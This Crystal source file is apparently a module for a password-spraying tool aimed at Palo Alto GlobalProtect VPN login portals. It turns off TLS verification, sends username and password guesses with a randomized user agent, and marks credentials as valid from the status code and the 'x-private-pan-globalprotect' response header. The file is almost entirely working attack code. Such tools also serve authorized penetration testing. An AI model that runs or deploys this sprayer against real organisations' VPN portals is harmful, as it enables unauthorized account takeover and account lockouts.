require "http/client"

class GlobalProtect < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String)  : SprayStatus
         # lockedout = false
        # valid = false
        # mfa = false
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header from inputs. theres only 1 by default 
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        } 

        form = "prot=https%3A&server=#{url.host}&inputStr=&action=getsoftware&user=#{URI.encode_www_form(username)}&passwd=#{URI.encode_www_form(password)}&new-passwd=&confirm-new-passwd=&ok=Log+In" # request form params here
        
        # here is the basic request 
        page = client.post(url.path, headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        
        # this is a temp check. by defualt the status code is 512. so if not it might be valid
        if page.status_code != 512
            # valid = true 
            spstatus.valid_credentials = true 
        end

        # these should work.... if not wtf is palo doing with an "auth-failed" header on valid credentials
        if page.headers["x-private-pan-globalprotect"].downcase != "auth-failed" && page.headers["x-private-pan-globalprotect"].downcase != "auth-failed-invalid-user-input" # should always be a lowercase header value but just in case. and the second one is a final error
            # valid = true 
            spstatus.valid_credentials = true 
        end

        # if page.body.includes? "redircting to mfa"
        #     mfa = true 
        # end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus
    end
end